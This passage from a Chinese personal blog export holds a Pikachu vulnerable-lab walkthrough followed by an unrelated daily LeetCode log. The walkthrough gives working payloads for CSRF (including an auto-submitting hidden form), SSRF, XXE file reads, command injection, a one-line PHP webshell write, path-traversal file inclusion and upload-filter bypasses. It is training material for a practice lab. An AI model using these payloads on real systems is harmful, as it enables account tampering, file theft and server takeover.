(get)</h3><blockquote><p>依据原理，先登录，然后抓包，修改包，发现数据修改成功。说明有CSRF漏洞，攻击者可以在用户登录成功后，让用户点击恶意链接来发送构造后的包，从而达到攻击者修改用户信息的目的。</p><p>Payload：<code>?sex=girl&amp;phonenum=15988767673&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit</code></p></blockquote><h3 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2 CSRF (post)"></a>2 CSRF (post)</h3><blockquote><p>同理get，只不过请求方式改变而已。</p><p>Payload：<code>sex=girl&amp;phonenum=15988767673&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit</code></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在页面中恶意构造下列语句，将自动提交表单。若受害者登录后CSRF漏洞将会被触发--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">                                                                                                       <span class="comment">&lt;!-- 这个script是用来自动提交表单的 --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        window.onload = function() &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementById(&quot;submit&quot;).click();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>              </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ip/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span>    </span><br><span class="line">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;12345678922&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiannv@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>/&gt;</span>                    <span class="comment">&lt;!-- style设置为display:none起到隐藏submit按钮的作用 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3 CSRF Token"></a>3 CSRF Token</h3><blockquote><p>此页面必须携带token，且新token每次都会在响应页面中。所以要多次修改数据，必须查看页面中的token，类似暴力破解的token生成。</p><p>payload：<code>?sex=cat&amp;phonenum=15988767673&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;token=9993964ffb4e0353a8081347169&amp;submit=submit</code></p></blockquote><h2 id="九、SSRF漏洞"><a href="#九、SSRF漏洞" class="headerlink" title="九、SSRF漏洞"></a>九、SSRF漏洞</h2><h3 id="1-SSRF-curl"><a href="#1-SSRF-curl" class="headerlink" title="1 SSRF(curl)"></a>1 SSRF(curl)</h3><blockquote><p>点击链接，发现在url中可以包含http请求。</p><p>构造如下payload来测试端口是否开放：<code>?url=http://127.0.0.1:3306</code>。</p><p>也可以利用burp suite对端口进行大范围扫描。</p></blockquote><h3 id="2-SSRF-file-get-content"><a href="#2-SSRF-file-get-content" class="headerlink" title="2 SSRF(file_get_content)"></a>2 SSRF(file_get_content)</h3><blockquote><p>点击链接，发现在url中可以包含http请求。</p><p>因为该漏洞产生的函数是file_get_content，所以可以利用伪协议来读取文件。</p><p>payload：<code>?file=php://filter/read=convert.base64-encode/resource=ssrf.php</code>包含源码。</p><p>payload：<code>?file:///c:/windows/win.ini</code>读取系统文件。</p></blockquote><h2 id="十、URL重定向"><a href="#十、URL重定向" class="headerlink" title="十、URL重定向"></a>十、URL重定向</h2><h3 id="1-不安全的URL跳转"><a href="#1-不安全的URL跳转" class="headerlink" title="1 不安全的URL跳转"></a>1 不安全的URL跳转</h3><blockquote><p>点击最后一个链接，直接修改url参数访问别的URL即可。</p><p>payload：<code>?url=http://www.bilibili.com</code></p></blockquote><h2 id="十一、敏感信息泄露"><a href="#十一、敏感信息泄露" class="headerlink" title="十一、敏感信息泄露"></a>十一、敏感信息泄露</h2><h3 id="1-IcanseeyourABC"><a href="#1-IcanseeyourABC" class="headerlink" title="1 IcanseeyourABC"></a>1 IcanseeyourABC</h3><blockquote><p>F12，找到密码栏对应的html，发现下面有账号和密码：lili/123456。</p><p>登录成功后，记录URL，退出登录。直接访问<code>http://127.0.0.1/pikachu/vul/infoleak/abc.php</code>，发现可以访问成功。</p></blockquote><h2 id="十二、XXE漏洞"><a href="#十二、XXE漏洞" class="headerlink" title="十二、XXE漏洞"></a>十二、XXE漏洞</h2><h3 id="1-XXE"><a href="#1-XXE" class="headerlink" title="1 XXE"></a>1 XXE</h3><blockquote><p>存在XXE漏洞，输入如下payload即可。</p><p>端口爆破时要在bp中开始攻击后，点击column——response received，查看响应时间，短表示开放。</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--xxe回显--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;xxe&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取系统文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取源码--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--端口爆破，可以开bp自动化爆破--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe<span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span>;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="十三、RCE"><a href="#十三、RCE" class="headerlink" title="十三、RCE"></a>十三、RCE</h2><h3 id="1-exec-“ping”"><a href="#1-exec-“ping”" class="headerlink" title="1 exec “ping”"></a>1 exec “ping”</h3><blockquote><p>Payload：<code>ping 127.0.0.1|whoami</code></p></blockquote><h3 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2 exec “eval”"></a>2 exec “eval”</h3><blockquote><p>Payload：<code>fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php assert($_POST[fin]);?&gt;&#39;);</code>，然后蚁剑连接。</p></blockquote><h2 id="十四、文件包含"><a href="#十四、文件包含" class="headerlink" title="十四、文件包含"></a>十四、文件包含</h2><h3 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1 本地文件包含"></a>1 本地文件包含</h3><blockquote><p> <code>?filename=../../../../windows/win.ini&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></p></blockquote><h2 id="十五、文件上传"><a href="#十五、文件上传" class="headerlink" title="十五、文件上传"></a>十五、文件上传</h2><h3 id="1-client-check"><a href="#1-client-check" class="headerlink" title="1 client check"></a>1 client check</h3><blockquote><p>该题是前端验证。可以在做好payload后，修改文件后缀为jpg，再用bp抓包改回php即可。</p><p>文件内容为：<code>&lt;?php phpinfo(); ?&gt;</code></p></blockquote><h3 id="2-MIME-type"><a href="#2-MIME-type" class="headerlink" title="2 MIME type"></a>2 MIME type</h3><blockquote><p>该题为类型验证。做好payload后，修改文件后缀为jpg，再用bp抓包改回php即可。</p><p>文件内容为：<code>&lt;?php phpinfo(); ?&gt;</code></p></blockquote><h3 id="3-getimagesize"><a href="#3-getimagesize" class="headerlink" title="3 getimagesize"></a>3 getimagesize</h3><blockquote><p>图片判断函数。可以用<code>copy 1.jpg /b + 2.txt /a 3.jpg</code>拼接后上传图片。然后利用之前的文件包含漏洞访问该图片即可执行里面的php代码。</p><p><code>2.txt</code>的内容为<code>&lt;?php phpinfo(); ?&gt;</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023的日常</title>
      <link href="/posts/8cf58e13.html"/>
      <url>/posts/8cf58e13.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/Magialeaf/Daily_leetcode">my::力扣每日题</a></p></blockquote><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-11"><a href="#2023-11" class="headerlink" title="2023-11"></a>2023-11</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-11"><a href="#2023-11-11" class="headerlink" title="2023-11-11"></a>2023-11-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-11-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-11-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-11-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-11-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-11-1"><p>…</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-11-2"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-11-3"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-11-4"><p>待更新</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-10"><a href="#2023-11-10" class="headerlink" title="2023-11-10"></a>2023-11-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-10-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-10-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-10-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-10-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-10-1"><p>…</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-10-2"><p><a href="https://leetcode.cn/problems/successful-pairs-of-spells-and-potions/">2300. 咒语和药水的成功对数</a></p><p>C++：排序 + 二分。对每次都positions做二分查找。然后将结果加到res中，返回res。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-10-3"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-10-4"><p>待更新</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-09"><a href="#2023-11-09" class="headerlink" title="2023-11-09"></a>2023-11-09</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-09"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-09-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-09-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-09-1"><p>Vue学习。</p><p>Cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-09-2"><p><a href="https://leetcode.cn/problems/escape-the-spreading-fire/">2258. 逃离火灾</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-08"><a href="#2023-11-08" class="headerlink" title="2023-11-08"></a>2023-11-08</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-08"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-08-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-08-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-08-1"><p>Vue学习。</p><p>Cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-08-2"><p><a href="https://leetcode.cn/problems/find-the-longest-balanced-substring-of-a-binary-string/">2609. 最长平衡子字符串</a></p><p>C++思路：计数。for循环。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-07"><a href="#2023-11-07" class="headerlink" title="2023-11-07"></a>2023-11-07</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-07"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-07-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-07-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-07-1"><p>Vue学习。</p><p>算法学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-07-2"><p><a href="https://leetcode.cn/problems/count-the-number-of-vowel-strings-in-range/">2586. 统计范围内的元音字符串数</a></p><p>C++思路：模拟。</p><p>时间：<script type="math/tex">O(n + L)</script>，L=5</p><p>空间：<script type="math/tex">O(L)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-06"><a href="#2023-11-06" class="headerlink" title="2023-11-06"></a>2023-11-06</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-06"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-06-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-06-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-06-1"><p>Vue学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-06-2"><p><a href="https://leetcode.cn/problems/maximum-product-of-word-lengths/">318. 最大单词长度乘积</a></p><p>python3：暴力。先set去重然后按题意两个for依次判断。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-05"><a href="#2023-11-05" class="headerlink" title="2023-11-05"></a>2023-11-05</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-05"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-05-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-05-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-05-1"><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-05-2"><p><a href="https://leetcode.cn/problems/repeated-dna-sequences/">187. 重复的DNA序列</a></p><p>C++思路：一个for循环，依次切出子串，将子串出现次数加入到字典中，若次数等于2，将该子串加入到结果数组中，返回结果。</p><p>时间：<script type="math/tex">O(nL)</script>，L=10</p><p>空间：<script type="math/tex">O(nL)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-04"><a href="#2023-11-04" class="headerlink" title="2023-11-04"></a>2023-11-04</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-04"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-04-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-04-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-04-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-04-1"><p>算法学习。</p><p>文章更新。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-04-2"><p><a href="https://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/">421. 数组中两个数的最大异或值</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-04-3"><p>更新了部分文章的结构：Web后端文章，游戏程序文章。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-03"><a href="#2023-11-03" class="headerlink" title="2023-11-03"></a>2023-11-03</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-03"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-03-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-03-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-11-03-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-03-1"><p>Bootstrap学习。</p><p>Vue学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-03-2"><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/">117. 填充每个节点的下一个右侧节点指针 II</a></p><p>C++思路：BFS，队列辅助。每次出队后判断该节点是否是该层的尾节点，如果不是则将该节点的next指向队头结点，如果是则将该节点的next指向NULL。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-03-3"><p>新增：Bootstrap。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-02"><a href="#2023-11-02" class="headerlink" title="2023-11-02"></a>2023-11-02</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-02"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-02-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-02-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-02-1"><p>vue学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-02-2"><p><a href="https://leetcode.cn/problems/rings-and-rods/">2103. 环和杆</a></p><p>C++思路：字典。键是0-9，值是RGB的数量的容器。当RGB数量都大于0时结果加一，返回结果。</p><p>时间：<script type="math/tex">O(nk+mk)</script>，m：杆数量，k：颜色数量。n：rings长度。</p><p>空间：<script type="math/tex">O(mk)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-11-01"><a href="#2023-11-01" class="headerlink" title="2023-11-01"></a>2023-11-01</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-11-01"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-11-01-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-11-01-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-11-01-1"><p>vue学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-11-01-2"><p><a href="https://leetcode.cn/problems/maximum-employees-to-be-invited-to-a-meeting/">2127. 参加会议的最多员工数</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-10"><a href="#2023-10" class="headerlink" title="2023-10"></a>2023-10</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-31"><a href="#2023-10-31" class="headerlink" title="2023-10-31"></a>2023-10-31</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-31"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-31-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-31-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-31-1"><p>vue学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-31-2"><p><a href="https://leetcode.cn/problems/smallest-missing-genetic-value-in-each-subtree/">2003. 每棵子树内缺失的最小基因值</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-30"><a href="#2023-10-30" class="headerlink" title="2023-10-30"></a>2023-10-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-30-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-30-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-30-1"><p>vue学习。</p><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-30-2"><p><a href="https://leetcode.cn/problems/h-index-ii/">275. H 指数 II</a></p><p>C++：二分查找。条件是<code>if(citations[mid] &gt;= len - mid)</code>移动rp，返回值是<code>len - lp</code>。</p><p>时间：<script type="math/tex">O(logn)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-29"><a href="#2023-10-29" class="headerlink" title="2023-10-29"></a>2023-10-29</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-29"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-29-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-29-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-10-29-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-29-1"><p>vue学习。</p><p>Django学习。</p><p>算法练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-29-2"><p><a href="https://leetcode.cn/problems/h-index/">274. H 指数</a></p><p>C++思路：计数排序。先计数，然后按题意依次拿出来判断是否满足条件。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-29-3"><p>新增：算法进阶</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-28"><a href="#2023-10-28" class="headerlink" title="2023-10-28"></a>2023-10-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-28-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-28-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-28-1"><p>vue学习。</p><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-28-2"><p><a href="https://leetcode.cn/problems/take-gifts-from-the-richest-pile/">2558. 从数量最多的堆取走礼物</a></p><p>C++：最大堆。先建堆，然后对k一个for，每次按题意出堆操作后入堆。最后再累加，类型是<code>long long</code>。</p><p>时间：<script type="math/tex">O(klogn)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-27"><a href="#2023-10-27" class="headerlink" title="2023-10-27"></a>2023-10-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-27-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-27-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-27-1"><p>vue学习。</p><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-27-2"><p><a href="https://leetcode.cn/problems/maximum-area-of-a-piece-of-cake-after-horizontal-and-vertical-cuts/">1465. 切割后面积最大的蛋糕</a></p><p>C++：排序，然后贪心，选出最大的高和宽相乘。</p><p>时间：<script type="math/tex">O(max(nlogn,mlogm))</script></p><p>空间：<script 